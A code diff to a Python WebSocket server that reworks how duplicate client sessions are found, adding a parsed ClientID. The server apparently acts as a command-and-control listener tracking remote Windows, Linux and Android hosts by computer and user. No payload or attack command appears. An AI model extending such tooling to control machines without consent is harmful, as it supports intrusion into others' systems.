@@ -371,11 +371,14 @@ class WebSocketServer:
         self.input_thread = threading.Thread(target=read_input, daemon=True)
         self.input_thread.start()
     
-    def find_duplicate_session(self, computer, user, client_ip):
-        """Check if there's already an active session from the same computer"""
+    def find_duplicate_session(self, computer, user, client_ip, client_id=None):
+        """Check if there's already an active session from the same client"""
         for sid, session in list(self.sessions.items()):
-            # Check if same computer/user combo exists
-            if (session.get('computer') == computer and 
+            # First priority: Check by ClientID (unique per client instance)
+            if client_id and session.get('client_id') == client_id and client_id != 'Unknown':
+                return sid
+            # Fallback: Check if same computer/user combo exists (only if no ClientID)
+            if not client_id and (session.get('computer') == computer and 
                 session.get('user') == user and 
                 computer != 'Unknown'):
                 return sid
@@ -418,6 +421,7 @@ class WebSocketServer:
             'file_name': '',
             'computer': 'Unknown',
             'user': 'Unknown',
+            'client_id': 'Unknown',  # Unique client identifier
             'os_type': 'unknown'  # windows, linux, android
         }
         
@@ -464,6 +468,8 @@ class WebSocketServer:
                         device_match = re.search(r'Device:\s*(.+?)(?:\||$|\n)', text_data)
                         
                         user_match = re.search(r'User:\s*(\S+)', text_data)
+                        # ClientID for unique client identification
+                        clientid_match = re.search(r'ClientID:\s*(\S+)', text_data)
                         
                         if comp_match:
                             session['computer'] = comp_match.group(1)
@@ -475,9 +481,12 @@ class WebSocketServer:
                         if user_match:
                             session['user'] = user_match.group(1)
                         
+                        if clientid_match:
+                            session['client_id'] = clientid_match.group(1)
+                        
                         if session['computer'] != 'Unknown':
-                            # Check for duplicate session from same computer
-                            dup_sid = self.find_duplicate_session(session['computer'], session['user'], client_ip)
+                            # Check for duplicate session using ClientID (preferred) or computer/user
+                            dup_sid = self.find_duplicate_session(session['computer'], session['user'], client_ip, session.get('client_id'))
                             if dup_sid and dup_sid != session_id:
                                 # Close the older duplicate session
                                 try:
@@ -489,7 +498,7 @@ class WebSocketServer:
                                     del self.sessions[dup_sid]
                                 if self.active_session == dup_sid:
                                     self.active_session = None
-                                self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same computer: {session['computer']})")
+                                self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same client: {session.get('client_id', session['computer'])})")
                             
                             os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
                             self.message_queue.put(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
